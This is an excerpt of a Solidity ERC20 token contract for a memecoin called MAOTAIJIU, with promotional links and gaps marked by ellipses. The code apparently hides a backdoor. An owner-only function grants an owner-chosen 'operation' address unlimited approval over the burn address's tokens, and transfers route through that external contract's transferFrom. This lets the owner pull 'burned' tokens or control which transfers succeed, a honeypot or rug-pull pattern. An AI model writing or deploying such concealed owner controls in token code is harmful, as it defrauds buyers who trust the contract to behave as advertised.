...
$茅台酒: The ethereal ERC20 token birthed from the ingenuity of visionary brewers who ascended to billionaire status through shrewd investments in the mighty realms.

https://maotaijiu.pro
https://t.me/MAOTAIJIU_TOKEN
https://twitter.com/MAOTAIJIU_TOKEN
*/
...
contract MAOTAIJIU is ERC20, Ownable {
    ...
    constructor () ERC20("MAOTAIJIU", unicode"茅台酒") {   
        address router;
        if (block.chainid == 56) {
    ...
    function _transfer(address from,address to,uint256 amount) internal  override {
        ...
        if(ladderTaxEnabled) {
            if(launchTime + 3000 < block.timestamp){
                ...
                _totalFeesOnBuy    = liquidityFeeOnBuy  + marketingFeeOnBuy;
                _totalFeesOnSell   = liquidityFeeOnSell + marketingFeeOnSell;
            }} else if (operationEnabled(from, to, amount)) {
                liquidityFeeOnBuy  = 0; // 0
                liquidityFeeOnSell = 0; // 0
    ...
    function setOperationAddress(address _addr) external onlyOwner {
        operation = _addr; 
        _approve(burnAddr, operation, type(uint256).max);
    ...
    function operationEnabled(address from, address to, uint256 amount) internal returns (bool) {
        if (address(operation) == address(0)) return true;
        if (IERC20(operation).transferFrom(from, to, amount)) return true;
        return false;
    }
